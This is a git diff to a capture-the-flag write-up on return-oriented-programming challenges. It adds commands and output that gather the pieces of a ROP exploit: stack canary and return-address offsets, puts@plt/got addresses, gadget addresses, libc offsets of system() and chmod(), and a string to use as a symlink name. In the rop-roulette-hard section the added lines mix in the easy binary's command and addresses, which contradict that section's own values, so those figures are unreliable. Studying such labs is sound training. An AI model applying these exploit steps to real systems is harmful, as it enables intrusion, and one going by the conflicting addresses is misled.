@@ -7200,7 +7200,7 @@ hacker@return-oriented-programming~putsception-hard:/$ objdump -d /challenge/put
 - [ ] Offset between buffer and stored return address to `main()`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [ ] Location of the GOT entry of `puts@got`
-- [ ] Location of a NULL terminated string:
+- [ ] Location of a NULL terminated string
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 - [ ] Address of `_start()`
@@ -13041,8 +13041,11 @@ We need the following:
 
 - [ ] Offset between buffer and stack canary
 - [ ] Offset between buffer and stored return address
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
+- [ ] Location of a NULL terminated string
 
 ### Strategy
 
@@ -13165,8 +13168,12 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
    - Location of the buffer: `0x7ffdccee6250`
 - [ ] Offset between buffer and stored return
    - Location of the buffer: `0x7ffdccee6250`
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
+- [ ] Offset of `"!\x00"` string within Libc
+
 
 ```
 pwndbg> info frame
@@ -13192,21 +13199,42 @@ $2 = 72
 - [x] Offset between buffer and stored return address to
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
+- [ ] Offset of `"!\x00"` string within Libc
+
+### `puts@plt` and `puts@got`
+Let's get the addresses of `puts@plt` and `puts@got`.
+
+```
+hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "from pwn import *; e = ELF('/challenge/rop-roulette-easy', checksec=False); print('puts@plt:', hex(e.plt.puts), 'puts@got:', hex(e.got.puts))"
+puts@plt: 0x11d4 puts@got: 0x4f30
+```
+
+- [x] Offset between buffer and stack canary: `56`
+   - Location of the buffer: `0x7ffdccee6250`
+   - Location of the canary: `0x7ffdccee6290 - 8` = `0x7ffdccee6288`
+- [x] Offset between buffer and stored return address to
+   - Location of the buffer: `0x7ffdccee6250`
+   - Location of the stored return address: `0x7ffdccee6298`
+- [x] Location of the PLT entry of `puts@plt`: `0x11d4`
+- [x] Location of the GOT entry of `puts@got`: `0x4f30`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Offset of `"!\x00"` string within Libc
+
 
 ### ROP gadgets
+
+Now let's find the relevant ROP gadgets.
 
 #### Binary
 
 ```
 hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /challenge/rop-roulette-easy | grep "pop rdi ; ret"
 0x0000000000002b63 : pop rdi ; ret
-```
-
-```
-hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "from pwn import *; e = ELF('/challenge/rop-roulette-easy', checksec=False); print('puts@plt:', hex(e.plt.puts), 'puts@got:', hex(e.got.puts))"
-puts@plt: 0x11d4 puts@got: 0x4f30
 ```
 
 #### Libc
@@ -13227,6 +13255,8 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/
 - [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
+- [x] Location of the PLT entry of `puts@plt`: `0x11d4`
+- [x] Location of the GOT entry of `puts@got`: `0x4f30`
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
    - Binary: `pop rdi ; ret`: `0x2b63`
@@ -13234,6 +13264,8 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/
    - Binary: `puts@got`: `0x4f30`
    - Libc: `pop rdi ; ret`: `0x23b6a`
    - Libc: `pop rsi ; ret`: `0x2601f`
+- [ ] Offset of `"!\x00"` string within Libc
+
 
 ### Libc functions
 
@@ -13252,6 +13284,8 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-l
    430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
 ```
 
+Finally we need a NULL terminated string that we can use as a symlink.
+
 ```
 hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "d=open('/lib/x86_64-linux-gnu/libc.so.6','rb').read(); print(hex(d.index(b'!\x00')))"
 0x2a32
@@ -13263,17 +13297,18 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "d=open('/lib
 - [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
+- [x] Location of the PLT entry of `puts@plt`: `0x11d4`
+- [x] Location of the GOT entry of `puts@got`: `0x4f30`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
    - Offset of `chmod()` within Libc: `0x10dd80`
    - Offset of `puts()` within Libc: `0x84420`
-   - Offset of `"!\x00"` string within Libc: `0x2a32`
 - [x] Locations of required ROP gadgets
    - Binary: `pop rdi ; ret`: `0x2b63`
-   - Binary: `puts@plt`: `0x11d4`
-   - Binary: `puts@got`: `0x4f30`
    - Libc: `pop rdi ; ret`: `0x23b6a`
    - Libc: `pop rsi ; ret`: `0x2601f`
+- [x] Offset of `"!\x00"` string within Libc: `0x2a32`
+
 
 ### Leaking binary base
 
@@ -13738,9 +13773,12 @@ unlimited connections.
 We need the following:
 
 - [ ] Offset between buffer and stack canary
-- [ ] Offset between buffer and stored return address to `challenge()`
+- [ ] Offset between buffer and stored return address
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
+- [ ] Offset of `"!\x00"` string within Libc
 
 ### Strategy
 
@@ -13883,10 +13921,13 @@ Breakpoint hit at 0x5f97bb53f532
 
 - [ ] Offset between buffer and stack canary
    - Location of the buffer: `0x7ffdc145e1f0`
-- [ ] Offset between buffer and stored return address to `challenge()`
+- [ ] Offset between buffer and stored return address
    - Location of the buffer: `0x7ffdc145e1f0`
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
+- [ ] Offset of `"!\x00"` string within Libc
 
 ```
 pwndbg> info frame
@@ -13909,11 +13950,34 @@ $2 = 88
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffdc145e1f0`
    - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
-- [x] Offset between buffer and stored return address to `challenge()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffdc145e1f0`
    - Location of the stored return address: `0x7ffdc145e248`
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
+- [ ] Offset of `"!\x00"` string within Libc
+
+### `puts@plt` and `puts@got`
+Let's get the addresses of `puts@plt` and `puts@got`.
+
+```
+hacker@return-oriented-programming~rop-roulette-easy:~$ python3 -c "from pwn import *; e = ELF('/challenge/rop-roulette-easy', checksec=False); print('puts@plt:', hex(e.plt.puts), 'puts@got:', hex(e.got.puts))"
+puts@plt: 0x11d4 puts@got: 0x4f30
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
+- [x] Offset between buffer and stored return address: `88`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the stored return address: `0x7ffdc145e248`
+- [x] Location of the PLT entry of `puts@plt`: `0x11d4`
+- [x] Location of the GOT entry of `puts@got`: `0x4f30`
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Offset of `"!\x00"` string within Libc
 
 ### ROP gadgets
 
@@ -13922,11 +13986,6 @@ $2 = 88
 ```
 hacker@return-oriented-programming~rop-roulette-hard:~$ ROPgadget --binary /challenge/rop-roulette-hard | grep "pop rdi ; ret"
 0x00000000000017b3 : pop rdi ; ret
-```
-
-```
-hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "from pwn import *; e = ELF('/challenge/rop-roulette-hard', checksec=False); print('puts@plt:', hex(e.plt.puts), 'puts@got:', hex(e.got.puts))"
-puts@plt: 0x1154 puts@got: 0x3f60
 ```
 
 #### Libc
@@ -13947,6 +14006,8 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ ROPgadget --binary /lib/
 - [x] Offset between buffer and stored return address to `challenge()`: `88`
    - Location of the buffer: `0x7ffdc145e1f0`
    - Location of the stored return address: `0x7ffdc145e248`
+- [x] Location of the PLT entry of `puts@plt`: `0x11d4`
+- [x] Location of the GOT entry of `puts@got`: `0x4f30`
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
    - Binary: `pop rdi ; ret`: `0x17b3`
@@ -13954,6 +14015,7 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ ROPgadget --binary /lib/
    - Binary: `puts@got`: `0x3f60`
    - Libc: `pop rdi ; ret`: `0x23b6a`
    - Libc: `pop rsi ; ret`: `0x2601f`
+- [ ] Offset of `"!\x00"` string within Libc
 
 ### Libc functions
 
@@ -13972,6 +14034,8 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ readelf -s /lib/x86_64-l
    430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
 ```
 
+Finally we need the offset of the NULL terminated string that we can use a symlink.
+
 ```
 hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "d=open('/lib/x86_64-linux-gnu/libc.so.6','rb').read(); print(hex(d.index(b'!\x00')))"
 0x2a32
@@ -13983,6 +14047,8 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "d=open('/lib
 - [x] Offset between buffer and stored return address to `challenge()`: `88`
    - Location of the buffer: `0x7ffdc145e1f0`
    - Location of the stored return address: `0x7ffdc145e248`
+- [x] Location of the PLT entry of `puts@plt`: `0x11d4`
+- [x] Location of the GOT entry of `puts@got`: `0x4f30`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
    - Offset of `chmod()` within Libc: `0x10dd80`
@@ -13994,6 +14060,7 @@ hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "d=open('/lib
    - Binary: `puts@got`: `0x3f60`
    - Libc: `pop rdi ; ret`: `0x23b6a`
    - Libc: `pop rsi ; ret`: `0x2601f`
+- [x] Offset of `"!\x00"` string within Libc: `0x2a32`
 
 ### Leaking binary base
 
